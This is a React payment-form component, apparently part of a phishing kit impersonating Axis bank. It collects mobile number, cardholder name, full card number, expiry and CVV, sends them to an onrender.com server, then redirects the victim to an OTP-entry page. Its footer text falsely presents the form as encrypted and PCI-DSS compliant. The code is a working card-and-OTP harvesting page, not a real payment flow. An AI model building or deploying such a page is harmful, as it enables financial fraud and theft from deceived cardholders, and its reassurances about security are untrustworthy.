import { useState } from "react";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import { FaCreditCard } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import "./PaymentForm.css";

export default function PaymentForm() {
  const [mobileNumber, setMobileNumber] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });
  const [countdown, setCountdown] = useState(5);

  const navigate = useNavigate();

  const handleMobileChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");
    setMobileNumber(value.slice(0, 10));
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    value = value.match(/.{1,4}/g)?.join(" ") || "";
    setCardNumber(value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage({ text: "", type: "" });

    if (!/^\d{10}$/.test(mobileNumber)) {
      return setMessage({
        text: "Mobile number must be exactly 10 digits",
        type: "error",
      });
    }

    const digitsOnly = cardNumber.replace(/\s/g, "");
    if (digitsOnly.length !== 16) {
      return setMessage({
        text: "Card number must be exactly 16 digits",
        type: "error",
      });
    }

    if (!/^\d{3}$/.test(e.target.cvv.value)) {
      return setMessage({
        text: "CVV must be exactly 3 digits",
        type: "error",
      });
    }

    setLoading(true);

    const data = {
      mobileNumber,
      name: e.target.name.value,
      cardNumber,
      expiryMonth: e.target.expiryMonth.value,
      expiryYear: e.target.expiryYear.value,
      cvv: e.target.cvv.value,
    };

    try {
      const res = await fetch("https://axisonline-1.onrender.com/api/cards", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      const result = await res.json();

      if (res.ok) {
        setSuccess(true);
        setMessage({
          text: "OTP sending! Redirecting...",
          type: "success",
        });

        const timer = setInterval(() => {
          setCountdown((prev) => {
            if (prev === 1) {
              clearInterval(timer);
              navigate("/otp-submit", {
                state: {
                  mobileNumber: mobileNumber || "**********",
                },
              });
            }
            return prev - 1;
          });
        }, 1000);
      } else {
        setMessage({
          text: result.error || "Failed to save card",
          type: "error",
        });
      }
    } catch (err) {
      console.error(err);
      setMessage({
        text: "Server error, try again later",
        type: "error",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page">
      <div className="card-form">
        <h2>Card Details</h2>

        {message.text && (
          <div className={`form-message ${message.type}`}>
            {message.text}
          </div>
        )}

        {!success && (
          <form onSubmit={handleSubmit}>
            {/* Mobile Number */}
            <label>Mobile Number</label>
            <input
              type="tel"
              name="mobileNumber"
              placeholder="Enter mobile number"
              value={mobileNumber}
              onChange={handleMobileChange}
              maxLength={10}
              required
            />

            {/* Name */}
            <label>Name on Card</label>
            <input
              type="text"
              name="name"
              placeholder="Name on Card"
              required
            />

            {/* Card Number */}
            <label>Card Number</label>
            <input
              type="text"
              name="cardNumber"
              placeholder="5555 5555 5555 5555"
              value={cardNumber}
              onChange={handleCardNumberChange}
              maxLength={19}
              required
            />

            {/* Expiry */}
            <div className="row">
              <div>
                <label>Expiry Month</label>
                <select name="expiryMonth" required>
                  <option value="">MM</option>
                  {Array.from({ length: 12 }, (_, i) => (
                    <option
                      key={i}
                      value={String(i + 1).padStart(2, "0")}
                    >
                      {String(i + 1).padStart(2, "0")}
                    </option>
                  ))}
                </select>
              </div>

              <div>
                <label>Expiry Year</label>
                <select name="expiryYear" required>
                  <option value="">YY</option>
                  {[
                    "24","25","26","27","28","29","30",
                    "31","32","33","34","35","36","37",
                    "38","39","40","41","42","43","44","45"
                  ].map((y) => (
                    <option key={y} value={y}>{y}</option>
                  ))}
                </select>
              </div>
            </div>

            {/* CVV */}
            <label>CVV</label>
            <div className="pin-container">
              <input
                type={showPin ? "text" : "password"}
                name="cvv"
                placeholder="Enter CVV"
                maxLength={3}
                required
              />
              <span
                className="eye-icon"
                onClick={() => setShowPin((prev) => !prev)}
              >
                {showPin ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
              </span>
            </div>

            <button className="login-btn" type="submit" disabled={loading}>
              {loading ? "Submitting..." : "🔒 Submit Securely"}
            </button>
          </form>
        )}

        {success && (
          <div className="spinner-container">
            <FaCreditCard className="spinner-icon rotating" />
            <p>
              Redirecting in {countdown} second
              {countdown !== 1 ? "s" : ""}...
            </p>
          </div>
        )}

        <p className="secure-text">
          Your information is encrypted and securely transmitted.
        </p>
        <p className="secure-text">
          Axis follows international PCI-DSS compliance for all transactions.
        </p>
      </div>
    </div>
  );
}
